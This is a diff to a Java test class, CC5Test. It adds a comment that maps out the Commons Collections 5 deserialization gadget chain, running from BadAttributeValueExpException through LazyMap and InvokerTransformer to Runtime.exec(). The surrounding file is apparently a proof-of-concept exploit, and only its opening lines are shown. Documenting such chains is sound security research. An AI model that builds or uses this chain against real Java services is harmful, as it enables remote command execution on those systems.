@@ -15,6 +15,25 @@ import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
 
+/**
+ * Gadget chain:
+ *         ObjectInputStream.readObject()
+ *             BadAttributeValueExpException.readObject()
+ *                 TiedMapEntry.toString()
+ *                     LazyMap.get()
+ *                         ChainedTransformer.transform()
+ *                             ConstantTransformer.transform()
+ *                             InvokerTransformer.transform()
+ *                                 Method.invoke()
+ *                                     Class.getMethod()
+ *                             InvokerTransformer.transform()
+ *                                 Method.invoke()
+ *                                     Runtime.getRuntime()
+ *                             InvokerTransformer.transform()
+ *                                 Method.invoke()
+ *                                     Runtime.exec()
+ */
+
 public class CC5Test {
     public static void main (String[] args) throws Exception{
         Transformer[] fake = new Transformer[]{
